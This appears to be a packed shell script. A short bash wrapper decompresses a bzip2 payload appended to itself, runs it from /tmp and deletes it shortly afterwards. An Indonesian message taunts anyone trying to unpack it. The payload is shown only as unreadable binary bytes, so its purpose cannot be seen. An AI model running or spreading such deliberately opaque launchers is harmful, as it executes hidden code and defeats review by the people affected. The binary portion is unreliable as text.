#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY� �! ���� ����������pD@  `>w�T�{�y��ܾ�J����(R�*�T���I��i驵�h�=CL�i� �i�=C�Q�1�I��I<���� ��   @  �M5OR��j=           �IF�  � a      D�M�����0�Q�L���� i�OP4�J!4� &D�S��4�R`i6Hɦ��h�Pڌ�����S@��C�D6
�����i[����RqsT�xռ0i ?��4����$����r�Y�'	���kS(RIQ�EzqHH��@���Hв)��S5���O���p�nN[�klU�K�3#�ջ6��v<���P}ip^r�|�
����)KQ ��b'��c�yn�B!�D��
O���i1p�%�\K�QĐ����r���Ġ|���V�(>Nބ1٘��Љ��Ϩ7��g�aރ�j���b�CE'���k��ON�J�M^cs�^�q9N`Eǒ�qR�Y;�hq�gA��R��S*##��k��<��WQ��%��x� Ddmme=�z�V0M`9�D�ͦo7nNp9R(�a
+����M�Q���G��x�$��J�
��4����16:f�=C5���>� @쭖�L4J8�t�)*[��9�=�p��p �8�nA�ͅ0d��y=+E�(O 	B��Z�=@�� ڊ,P����V�e�<?�4f�xT߻hZ���D%Ϝ�7ݖ%UG��"dU�� )�p����p|�5�FN��$���Q���Xʱ�a�]
��(�u�w�ܗ��\�48���P�Q�E |�
�� ,�8ױ>��Ж�s)�p-<�0O��]��
�H1CZ!]������.�R۴o���3��.fT�9�~�R�LJP9�p@.�>��T ]��MZ�AD�t�x�m������BV2"��!��br����<�6U�R>O	d��)�>�5���Q��eg���쪻� �5�|S��@���;f��wC�5K���*8��|0�+�ܹu����H�Sn�hů�u�Ǒp�U�_M.A"����w���� ��ffi�4l�K���M b�� ь/��I���s�?I��/�ҭPьs=�ّZ�\o�ʆV�@�.�c��u���-F�bF�80g���K����-�+3 ���"�Ie:�%����W|?�bچ�X��$!�gߜ�wz��x-���?��E�P �VS2 �H��O��~FJ\�H~��n�T�Hc�Z�9���a�{��a*�â�(D;6/��+�'���C��A5�hՌ�X1qY;��Q>�(��Du"P� �͋�t`+>S��e�C�	��`�� %s?V�������Կu�����p�ݪ"W=u�&ccL��"6����d*X�C��o�CE!)�1�������8HB����$N��y��̽��{Ak���*cʴ�BoO���H"��T�,̈xh�gckE�a"���AM��e�JP�%� �耘g���B�#�I����`B-�P����W��,���YC�!Y+I�Z_���>�v�TV�Z�)����f:�0��v=o)��h���)}�P��E��,X,[��j^J_e���O�~y�4����d0�q�aM�ZB�\0��_�lGX���Y���� 3�JMm��Ň�3 I�)��iG9�L�h�l,�t�{��5��PkR��6�V�,�Jt�B�zD�V9�J@�e���Ƒ�H%�b��%A�ID����=�մ��MG�a!�x�LL�Z�ބ�t_�J��YU���A�j)� X��1ݝ��: ,�̛-���|��u7�$�@B�ᘮBaMR���K���v:Ɩ�lҚ��hQ�T�ؔ�:���p�� �o{{�'b�t;��&�.��w;|����bz��OGtʛ����	�C�v8��d�:�ĵ��;l�n�y/.OI�L-��Dk�?d]�l�G�G��.���X\�N\�i	�X�
{��^[Or�\4_�!F�c_~�p�Q����y�A���T��D:Jj+m����@�q[s�;�x$�ֶ/(��!A5�dZ'|��޸��(���A;�E�,l.'��۾�10H���۠;���҅��M��.Jv��Z�}ӟpGp/#��A,BA=X�@$���|9�a�ښ�׻���<5�9�(p�IA�!Q�S%�]���wȝ����h�B�ooC��x��J��E��21;��0J ���/+���{���K��u�0-*�D��W9f�.7�9�3尹.ϜP��D:�2lۿ-�n��b�9�K�rBR��ѱ��n�V�bJ���*X[А�L��.���%�nb�yy]�1���o;�c�ή��I�Ƃ��i������c@��Pa�0c�v��k�����S��{I��
i��cs�.0�t� ������� � �ȣ��G:xF�W�0Ld���)(��T�;�JD��HTJ�%(���tU��)���H�
� 